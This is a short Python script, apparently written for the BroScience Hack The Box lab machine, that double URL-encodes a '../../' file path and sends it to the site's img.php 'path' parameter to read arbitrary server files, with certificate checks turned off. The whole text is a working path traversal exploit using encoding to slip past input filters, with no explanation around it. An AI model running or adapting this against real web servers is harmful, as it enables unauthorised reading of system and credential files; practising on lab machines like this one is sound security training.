import requests
import sys
import argparse
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

parser = argparse.ArgumentParser()
parser.add_argument("--file", help="Complete Path with ../../")
args = parser.parse_args()

def encode_all(string):
	return "".join("%{0:0>2}".format(format(ord(char), "x")) for char in string)

url_encode1 = encode_all(args.file)
url_encoded_payload = encode_all(url_encode1)

#Send Request
url = f'https://broscience.htb/includes/img.php?path={url_encoded_payload}'
r = requests.get(url, verify=False)
print(r.text)
